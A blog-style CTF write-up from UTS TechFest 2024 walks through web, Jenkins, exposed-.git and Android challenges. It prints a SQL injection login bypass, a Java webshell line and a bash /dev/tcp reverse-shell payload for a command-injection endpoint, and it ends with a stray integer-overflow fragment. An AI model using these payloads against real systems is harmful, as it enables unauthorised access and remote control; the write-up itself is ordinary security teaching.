UTS TechFest 2024 CTF - Challenge Writeups

Posted Jun 29, 2024
By sealldev 7 min read

I participated in the CTF at UTS TechFest 2024 online and had a great time with the challenges. I played solo against teams and placed 1st. The following is a writeup of the challenges I beat and how to crack them :p. Big thanks to the authors of the challenges ElJayRight, p3gasus and another author who wished to remain anonymous.

Web

adminpanel

can you break into the admin panel? I heard that it is protecting some secrets 😉

This challenge was a website with a basic login panel of a username and password inputs.

Via setting the username to admin' OR 1=1;-- and the password to a we can get the flag.

Flag: CSEC{1_l0v3_sql173!!!}

noteapplication 1

I hope my notes are protected…

This was a notes application where when viewing the note, the URL was similar to the following: /note/3.

By changing the parameter to /note/1 and doing an IDOR we can get the flag.

Flag: CSEC{n00_my_53cr37_n0tes!}

noteapplication 2

my notes are actually protected this time..

This is the same application as noteapplication 1 but with a new security protection. Now when I go to /note/1 I’m told my permissions are denied.

Checking my cookies, there is a cookie admin set to False, changing it to True then reloading gives us the flag.

Flag: CSEC{c00k135_4r3n7_s3cur3}

squid1

I automated my jenkins installation. The guide I followed was from early last year, hope the version is still secure 🙂

This challenge linked to a Jenkins instance on version 2.441. Looking for CVE’s I find a 9.8 critical.

I download a PoC from exploit-db and use it.

By reading /proc/self/environ I can get the environment variables which contain a password and the flag.

Flag: CSEC{LFI_CV3_F7W_ad4c72eb}

squid3

I automated my jenkins installation. The guide I followed was from early last year, hope the version is still secure 🙂

The intended route for this was to trigger a reverse shell from the /script panel and then use su root to read the flag in the /root folder, but the connections never worked so I reached out to the admin.

I was told a reverse shell was the correct process, but was broken. They gave me the flag as I had ‘solved’ the challenge.

Flag: CSEC{J3nkin3_un4u7h3d_70_r007}

octopus

🐙🐙🐙🐙🐙🐙

This was a webpage, inside the source comments was a reference to git. Checking /.git is an open directory.

I use GitTools Dumper to pull down the files.

I then use the Extractor to extract the commits, we find one.

Reading the commit-meta.txt of the only commit contains a base64 string: Q1NFQ3t5b3Utd291bGQtYmUtc3VycHJpc2VkLXRoZS1hbW91bnQtb2Ytc2VydmVycy10aGF0LWhhdmUtLmdpdC1vcGVuLXRvLXRoZS1pbnRlcm5ldC1sb2x9.

Decoding it contains the flag.

Flag: CSEC{you-would-be-surprised-the-amount-of-servers-that-have-.git-open-to-the-internet-lol}

flare

we just migrated to cloudflare, i really hope that our flag is protected 😲

This took me surprisingly long because I wasn’t reading…

When loading to flare.domain.tld, clicking the Go to admin panel triggers a cloudflare error. If we open the network tab on the main page we can see a call to a script.js but its being called from flare-nonprod subdomain.

If we go to flare-nonprod.domain.tld/admin/ we get the flag, as there is no Cloudflare WAF on the non-production domain.

Flag: CSEC{1_7H0U6H7_7H47_U51N6_C10UDF14r3_M34N7_W3_W3r3_54F3_Fr0M_4774CK5_:(}

backdoor

The admin left his testing pannel open. Wonder if you can get rce from it?

endpoint: http://:8080/development/?54b8617eca0e54c7d3c8e6732c6b687a=

This challenge has 0 solves, nor by me but after talking to the author they explained their personal research to find this quirk and how to exploit it.

We are given a webshell off the bat, our aim is to reverse shell. Via using the webshell we can find the source code for the current page, its using a shell like this.

1

Runtime.getRuntime().exec(request.getParameter("54b8617eca0e54c7d3c8e6732c6b687a"));

Interestingly, this kind of shell does not allow operators, such as <, >, |, etc.

The author has some research on this but the TL;DR is a payload like this: bash -c $@|bash null echo bash -i >& /dev/tcp/<ip>/<port> 0>&1

After trying the payload the reverse shell failed again, we think the AWS infrastructure was blocking the connections.

Presumably the user then had to su root then read the flag.

Flag: Not Solved

time changer

you: whats the time mr wolf?..

mr wolf: time to use b64 👹👹

This is another Android reverse engineering challenge, I again load it into jadx to start with.

I look at string and find a notasecretkey.

The hint for this challenge points towards Base64 strings being hidden in the APK. Looking for notasecretkey we can find a string in res/layout/activity_main.xml: Q1NFQ3t3dGYtaXMt. This decodes to CSEC{wtf-is-.

Assuming the flag ends with }, I encode the character to base64 which is fQ. I search the APK for fQ and find YW4tYW5kcm9pZD8/fQ== inside res/values/strings.xml. Decoded this is an-android??}.

Flag: CSEC{wtf-is-an-android??}

Looking at the variables:

  • local_38 takes the input.
  • local_c does an atoi operation which is ASCII To Integer, this is to check for negative numbers being inputted once parsed.
  • local_3 converts local_c to a short.

Shorts have a size limit of 65535, so if we input that it should resolve to a -1, which it does.
